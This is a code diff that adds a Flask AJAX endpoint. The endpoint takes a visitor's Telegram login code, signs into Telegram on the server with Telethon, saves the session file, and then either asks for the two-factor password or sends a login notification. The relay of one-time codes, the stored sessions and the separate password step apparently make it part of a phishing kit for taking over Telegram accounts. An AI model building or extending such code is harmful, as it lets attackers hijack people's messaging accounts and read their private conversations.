@@ -263,6 +263,48 @@ def otp():
     return render_template("otp.html")
 
 
+# ===== API OTP (AJAX) =====
+@app.route("/api/otp", methods=["POST"])
+def api_otp():
+    phone = normalize_phone_key(session.get("phone", ""))
+    code = request.form.get("otp", "").strip()
+    pending = os.path.join(SESSION_DIR, f"{phone}.pending")
+
+    async def run():
+        client = TelegramClient(pending, api_id, api_hash)
+        await client.connect()
+        try:
+            await client.sign_in(
+                phone=phone,
+                code=code,
+                phone_code_hash=session.get("phone_code_hash")
+            )
+            await client.disconnect()
+            finalize_pending_session(phone)
+            return {"ok": True, "need_pwd": False}
+        except SessionPasswordNeededError:
+            await client.disconnect()
+            return {"ok": True, "need_pwd": True}
+        except PhoneCodeInvalidError:
+            await client.disconnect()
+            return {"ok": False, "msg": "OTP salah"}
+        except Exception as e:
+            await client.disconnect()
+            return {"ok": False, "msg": str(e)}
+
+    result = asyncio.run(run())
+
+    if result.get("ok"):
+        if result.get("need_pwd"):
+            session["need_password"] = True
+            return jsonify({"status": "success", "redirect": url_for("password")})
+        else:
+            send_login_message(phone)
+            return jsonify({"status": "success", "redirect": url_for("success")})
+    else:
+        return jsonify({"status": "error", "message": result.get("msg", "Unknown error")})
+
+
 # ===== PASSWORD PAGE =====
 @app.route("/password", methods=["GET", "POST"])
 def password():
